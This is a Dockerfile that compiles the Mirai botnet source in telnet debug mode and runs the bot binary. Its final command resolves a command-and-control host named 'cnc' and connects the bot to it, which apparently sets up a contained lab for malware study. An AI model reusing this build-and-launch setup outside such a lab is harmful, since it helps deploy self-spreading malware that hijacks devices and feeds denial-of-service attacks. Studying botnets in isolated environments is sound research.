# Stage 1: Build the bot
FROM ubuntu:20.04 AS build

# Set environment variables for non-interactive apt
ENV DEBIAN_FRONTEND=noninteractive

# Install necessary tools for building the bot
RUN apt-get update && apt-get install -y \
    build-essential \
    gcc \
    && rm -rf /var/lib/apt/lists/*

# Set the working directory
WORKDIR /build

# Copy the source code into the container
COPY . /build

# Compile the source code
RUN echo "building mirai" && ./build.sh debug telnet

# Stage 2: Create the runtime image
FROM ubuntu:20.04

# Set environment variables for non-interactive apt
ENV DEBIAN_FRONTEND=noninteractive

# Install any runtime dependencies (minimal)
RUN apt-get update && apt-get install -y \
    net-tools dnsutils \
    libstdc++6 \
    && rm -rf /var/lib/apt/lists/*

# Set the working directory
WORKDIR /app

# Copy the compiled binary from the build stage
COPY --from=build /build/debug/mirai.dbg /bot

# Expose any required ports (customize as needed)
# EXPOSE 23 80 443

# Command to run the bot
#CMD ["./bot"]

CMD IP=`ifconfig eth0 | grep 'inet ' | cut -d" " -f 10 | awk '{print $1}'` && CNC=`nslookup cnc | awk '/^Address: / { print $2 }'` && /bot $CNC $IP $CNC 0